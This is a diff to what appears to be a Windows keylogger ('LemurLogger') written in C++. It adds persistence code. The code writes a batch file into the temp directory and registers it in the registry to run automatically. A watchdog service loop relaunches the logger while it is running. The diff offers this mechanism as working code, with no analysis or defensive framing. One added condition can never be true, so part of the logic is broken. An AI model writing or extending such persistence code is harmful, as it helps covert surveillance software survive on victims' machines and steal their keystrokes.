@@ -10,6 +10,7 @@
 #include "Regedit.h"
 #include "prepare.h"
 #include "Process.h"
+#include <unistd.h>
 
 using namespace std;
 
@@ -37,23 +38,25 @@ int main()
         }
     }else{
     	if(filename == "LLservice.exe" &&  filename == "LLservice"){
+		usleep(500000);
  		while (GetIsOnProcess("LemurLogger.exe")||GetIsOnProcess("LemurLogger")){
                 	std::string msg = "sate idle";
         		Helper::WriteAppLog(msg);
+			IO::startup(path.c_str());
             	}
          }
     }
     if(filename == "LemurLogger.exe"|| filename =="LemurLogger")
 	   {
-            std::string batname = "\\batLLog.bat";
+                    std::string batname = "\\batLLog.bat";
 		    char* temp = getenv("temp");
 		    std::string temp_dir(temp);
-            std::string batpath = temp_dir+batname;
+                    std::string batpath = temp_dir+batname;
+	            if(!IO::exists_file(batpath)){
 		    IO::mkbat(IO::getFileNameWithPath(),batpath);
-                    //shell_cmd()
-                    //startup(fullpath.c_str());
                     Registry::RegisterProgram2(batname,batpath);
-            }
+            		}	
+    		}
 
 
     MSG Msg;
